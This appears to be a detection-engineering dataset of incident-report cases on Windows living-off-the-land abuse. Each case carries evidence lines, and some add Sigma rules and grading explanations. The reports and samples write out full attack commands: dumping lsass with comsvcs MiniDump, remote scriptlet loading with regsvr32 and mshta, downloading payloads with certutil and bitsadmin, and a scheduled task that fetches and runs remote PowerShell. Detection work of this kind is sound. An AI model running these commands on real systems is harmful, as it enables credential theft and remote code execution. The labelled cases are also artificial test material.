evidence: Telemetry shows rundll32.exe loading mshtml and calling the RunHTMLApplication export with an inline script
Legitimate use of rundll32.exe never passes a javascript: URI on the command line.
cases.report_text: During the intrusion at the logistics firm, the operator ran a first-stage script through a signed system binary. Telemetry shows rundll32.exe loading mshtml and calling the RunHTMLApplication export with an inline script, for example rundll32.exe javascript:\..\mshtml,RunHTMLApplication followed by a WScript.Shell Run call. Legitimate use of rundll32.exe never passes a javascript: URI on the command line. The same pattern appeared on three workstations within ten minutes, and every instance had Word or Explorer as the parent process. Detection should alert on rundll32.exe whose command line carries both javascript: and RunHTMLApplication, which keeps the rule specific to this loader.

title: Rundll32 Executing Inline JavaScript via RunHTMLApplication
id: 5b0c7a1e-3d42-4f6b-8a91-2c7e4d9f1a01
status: experimental
description: 'Detects rundll32.exe calling the mshtml RunHTMLApplication export with an inline javascript: URI to run a script.'
references:

author: case-author
date: 2026/10/02
tags:

  category: process_creation
  product: windows

  selection_img:

evidence: The actor ran rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Windows\Temp\lsa.dmp full
The same export can be reached by ordinal as comsvcs.dll #24, so the ordinal form must be covered as well.
cases.report_text: The credential theft stage was carried out without dropping a dumping tool. The actor ran rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Windows\Temp\lsa.dmp full, where 624 was the process identifier of lsass.exe resolved earlier with tasklist. The MiniDump export of comsvcs.dll is an undocumented way to write a process memory dump and no administration tooling in this environment uses it. The same export can be reached by ordinal as comsvcs.dll #24, so the ordinal form must be covered as well. The dump was compressed and uploaded within minutes. Defenders should detect rundll32.exe invoking comsvcs.dll together with the MiniDump export or its ordinal.

evidence: regsvr32.exe /s /n /u /i:http://files.cranemail.test/update.sct scrobj.dll
Analysts should alert when regsvr32.exe is started with scrobj.dll and a remote /i:http argument.
cases.report_text: The phishing document launched a scriptlet loader without writing an executable to disk. The activity began minutes after the user opened the attachment. Process telemetry recorded regsvr32.exe /s /n /u /i:http://files.cranemail.test/update.sct scrobj.dll, a technique often called Squiblydoo, which makes the signed regsvr32.exe fetch and run a remote scriptlet. The scrobj.dll library is the scriptlet runtime and there is no reason for it to appear in a regsvr32 command line in this estate. The /i: switch carried an http URL in every observed case. Analysts should alert when regsvr32.exe is started with scrobj.dll and a remote /i:http argument.

evidence: Observed command lines included mshta.exe http://docs.cranemail.test/invoice.hta and mshta.exe vbscript:Execute(window.close).
One internal tool, the HR portal launcher hrportal.exe, also starts mshta.exe but always with its local file hrportal.hta
Detection should cover mshta.exe invoked with an http, vbscript: or javascript: argument.
cases.report_text: Several endpoints started mshta.exe with a URL or inline script instead of a local application file. Observed command lines included mshta.exe http://docs.cranemail.test/invoice.hta and mshta.exe vbscript:Execute(window.close). Remote HTA content and inline vbscript: or javascript: URIs were the loaders used throughout this campaign. One internal tool, the HR portal launcher hrportal.exe, also starts mshta.exe but always with its local file hrportal.hta, so that launcher is a known false positive and should be excluded. Detection should cover mshta.exe invoked with an http, vbscript: or javascript: argument.

evidence: certutil.exe -urlcache -split -f http://203.0.113.45/svc.bin C:\Users\Public\svc.exe
Rules should match certutil.exe with both the urlcache and split switches in either dash style.
cases.report_text: The loader retrieved its second stage with certutil.exe instead of a browser. Process creation events show certutil.exe -urlcache -split -f http://203.0.113.45/svc.bin C:\Users\Public\svc.exe, run from a command shell spawned by a malicious macro. The urlcache and split switches are only used together when certutil is abused as a downloader. Variants of the same command used the slash form certutil.exe /urlcache /split /f, which certutil accepts equally. The downloaded file was renamed and executed within seconds. Rules should match certutil.exe with both the urlcache and split switches in either dash style.

evidence: bitsadmin.exe /transfer updatejob /download /priority high http://203.0.113.60/p.exe C:\Users\Public\p.exe
the operator switched to powershell.exe and called Start-BitsTransfer with a Source argument pointing at the same server
cases.report_text: BITS was used as a quiet downloader on infected hosts. A scheduled script ran bitsadmin.exe /transfer updatejob /download /priority high http://203.0.113.60/p.exe C:\Users\Public\p.exe, and in a second wave the operator switched to powershell.exe and called Start-BitsTransfer with a Source argument pointing at the same server. Both forms create a BITS job that survives a reboot until the transfer completes. The bitsadmin.exe /transfer switch together with /download is the telltale combination on the command line, and the cmdlet name Start-BitsTransfer is the equivalent marker for the PowerShell form.

lookalike.cmd: wmic.exe /node:WS-FIN-07 process call create C:\Program Files\RemoteSupport\client.exe

positive.cmd: wmic.exe /node:WS-FIN-07 /user:svc-backup process call create cmd.exe /c C:\Windows\Temp\run.bat
wmic /node:192.0.2.77 process   call   create cmd.exe /c whoami

evidence: The operator ran wmic.exe /node:WS-FIN-07 /user:svc-backup process call create cmd.exe /c C:\Windows\Temp\run.bat
The helpdesk toolkit hdtools.exe legitimately runs wmic.exe with the same call to start the remote support client
Detection should match wmic.exe with the process call create phrase.
cases.report_text: Lateral movement from the compromised file server relied on WMI process creation. The operator ran wmic.exe /node:WS-FIN-07 /user:svc-backup process call create cmd.exe /c C:\Windows\Temp\run.bat, which starts the batch file on the remote host through the Win32_Process class. The words process call create form the stable part of the command line, while spacing and the other switches varied between operators. The helpdesk toolkit hdtools.exe legitimately runs wmic.exe with the same call to start the remote support client, so processes launched by hdtools.exe should be excluded. Detection should match wmic.exe with the process call create phrase.
cases.sigma_yaml:
title: Wmic Process Call Create Remote Execution
id: c162d074-93a8-4fc1-a557-82d4a3f57007
status: experimental
description: 'Detects wmic.exe invoking the process call create method, excluding processes launched by the helpdesk toolkit.'

evidence: The captured command line was powershell.exe -nop -w hidden -enc followed by about 300 characters of base64
later waves used the long forms -WindowStyle Hidden and -EncodedCommand on powershell.exe or pwsh.exe
ccmexec.exe starts powershell.exe with -EncodedCommand and -WindowStyle Hidden for compliance baselines
cases.report_text: The loader executed its payload through hidden, encoded PowerShell. The captured command line was powershell.exe -nop -w hidden -enc followed by about 300 characters of base64, launched from a scheduled task, and later waves used the long forms -WindowStyle Hidden and -EncodedCommand on powershell.exe or pwsh.exe. A hidden window combined with an encoded command is the pairing attackers use to avoid a visible console and to conceal the script text. Configuration Manager is a known benign source: ccmexec.exe starts powershell.exe with -EncodedCommand and -WindowStyle Hidden for compliance baselines, so processes launched by ccmexec.exe should be excluded. Detection should require both an encoded command and a hidden window.

title: Hidden Window Encoded PowerShell Command
id: d273e185-a4b9-40d2-b668-93e5b4068108
status: experimental
description: 'Detects powershell.exe or pwsh.exe started with both an encoded command and a hidden window style, excluding Configuration Manager.'

author: case-author

  - attack.t1059.001

      - '\powershell.exe'
      - '\pwsh.exe'
  selection_enc:
    CommandLine|windash|contains: '-enc'
  selection_hidden:
    CommandLine|windash|contains:
      - '-w hidden'
      - '-WindowStyle Hidden'
  filter_sccm:
    ParentImage|endswith: '\ccmexec.exe'
  condition: selection_img and selection_enc and selection_hidden and not filter_sccm

  - 'Other management agents that start encoded hidden PowerShell and are not listed here'
level: high
cases.why: Correct rule: tag T1059.001 is valid, all values including the ccmexec.exe exclusion are quoted in the evidence, an encoded command AND a hidden window are both required (short and long spellings via windash), and encoding-only, hidden-only and SCCM look-alikes do not match.

evidence: Sysmon recorded winword.exe starting powershell.exe with a command line that used the Net.WebClient class and the DownloadString method
The same behaviour was observed from excel.exe in a second sample.
Detect winword.exe or excel.exe as parent of powershell.exe where the command line contains DownloadString, DownloadFile or Net.WebClient.
cases.report_text: A malicious Word attachment spawned PowerShell directly from the document process. Sysmon recorded winword.exe starting powershell.exe with a command line that used the Net.WebClient class and the DownloadString method to pull a script from the attacker server, then passed it to Invoke-Expression. The same behaviour was observed from excel.exe in a second sample. Office applications do not need to start PowerShell with download methods in normal operation. Detect winword.exe or excel.exe as parent of powershell.exe where the command line contains DownloadString, DownloadFile or Net.WebClient.

evidence: It was started with powershell.exe -nop -e followed by a single base64 argument of about 400 characters
Short forms of the -EncodedCommand switch such as -e, -en and -enc were all seen in the wild
cases.report_text: Incident responders recovered the stager from a compromised workstation. It was started with powershell.exe -nop -e followed by a single base64 argument of about 400 characters with no spaces inside the blob. The encoding conceals the script content from simple command-line review. Short forms of the -EncodedCommand switch such as -e, -en and -enc were all seen in the wild, so a rule keyed on the full switch name misses them. Normal automation at this site passes scripts with -File or -Command and never needs an encoded argument that long. Detection should match powershell.exe when an -e style switch is followed by a base64 argument of at least 40 characters.
cases.sigma_yaml:
title: Powershell Encoded Command With Long Base64 Argument
id: f4950307-c6db-42f4-988a-b507d628a30a
status: experimental
description: 'Detects powershell.exe started with an encoded command switch in a short or long form followed by a base64 argument of at least 40 characters.'

  selection_img:

level: medium
cases.why: Correct rule: tags match T1059.001 and T1027, powershell.exe and the encoded-command literal are quoted in the evidence, and the regex needs an -e, -en, -enc or -encodedcommand switch followed by a 40+ character argument, so a short encoded one-liner, -ExecutionPolicy, -eq and -File invocations do not match.

evidence: Process telemetry showed cmstp.exe /s /ns C:\Users\Public\corp.inf, where the INF file declared a UnRegisterOCXs section that loaded a remote scriptlet
Detection should match cmstp.exe with the /s and /ns switches and an .inf file argument.
cases.report_text: The intruder used the Connection Manager profile installer to execute a payload while bypassing application control. Process telemetry showed cmstp.exe /s /ns C:\Users\Public\corp.inf, where the INF file declared a UnRegisterOCXs section that loaded a remote scriptlet. The /s switch installs the profile silently and /ns suppresses the desktop shortcut, so no dialog is displayed to the user. The cmstp.exe binary is rarely used on normal corporate laptops because VPN profiles are deployed another way. Detection should match cmstp.exe with the /s and /ns switches and an .inf file argument.

schtasks.exe /create /tn WinUpdateCheck /sc daily /st 03:00 /tr "cmd.exe /c powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.91/u')"

evidence: The command observed on the file server was schtasks.exe /create /tn Updater /tr "powershell.exe -w hidden -File C:\ProgramData\Updater\sync.ps1" /sc onlogon /ru SYSTEM
Detection should match schtasks.exe with the /create switch, powershell in the task action and a hidden window style, written either -w hidden or -WindowStyle Hidden.
cases.report_text: The operator established persistence with a scheduled task that launches a hidden PowerShell script at every logon. The command observed on the file server was schtasks.exe /create /tn Updater /tr "powershell.exe -w hidden -File C:\ProgramData\Updater\sync.ps1" /sc onlogon /ru SYSTEM. Administrators at this site also create tasks that call PowerShell, for example with -NoProfile -ExecutionPolicy Bypass -File, but they never hide the window, so the hidden window style is what separates the two. Detection should match schtasks.exe with the /create switch, powershell in the task action and a hidden window style, written either -w hidden or -WindowStyle Hidden.
